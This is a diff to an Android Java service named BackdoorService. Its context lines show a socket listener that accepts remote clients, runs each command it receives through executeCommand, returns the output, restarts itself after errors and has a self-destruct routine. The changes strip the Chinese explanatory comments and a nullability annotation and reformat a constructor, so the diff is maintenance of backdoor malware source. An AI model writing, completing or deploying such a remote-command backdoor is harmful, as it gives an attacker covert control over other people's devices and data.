@@ -7,7 +7,7 @@ import android.app.Service;
 import android.content.Intent;
 import android.os.Build;
 import android.os.IBinder;
-import androidx.annotation.Nullable;
+
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.io.PrintWriter;
@@ -41,7 +41,6 @@ public class BackdoorService extends Service {
                 client.setSoTimeout(60000);
                 workerPool.execute(new CommandHandler(client));
             } catch (Exception e) {
-                // 发生错误时自动重启服务
                 closeServerSocket();
                 try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
             }
@@ -64,7 +63,6 @@ public class BackdoorService extends Service {
                 .build();
     }
 
-    // 自毁方法
     private synchronized void performShutdown() {
         if (isShutdown) return;
         isShutdown = true;
@@ -89,16 +87,17 @@ public class BackdoorService extends Service {
         workerPool.shutdownNow();
     }
 
-    @Nullable
     @Override
     public IBinder onBind(Intent intent) {
         return null;
     }
 
-    // 命令处理器
     private class CommandHandler implements Runnable {
         private Socket client;
-        public CommandHandler(Socket client) { this.client = client; }
+
+        public CommandHandler(Socket client) {
+            this.client = client;
+        }
 
         @Override
         public void run() {
@@ -111,7 +110,6 @@ public class BackdoorService extends Service {
                         performShutdown();
                         break;
                     }
-                    // 执行命令并返回结果
                     String result = executeCommand(command);
                     writer.println(result);
                     writer.println("=== END ===");
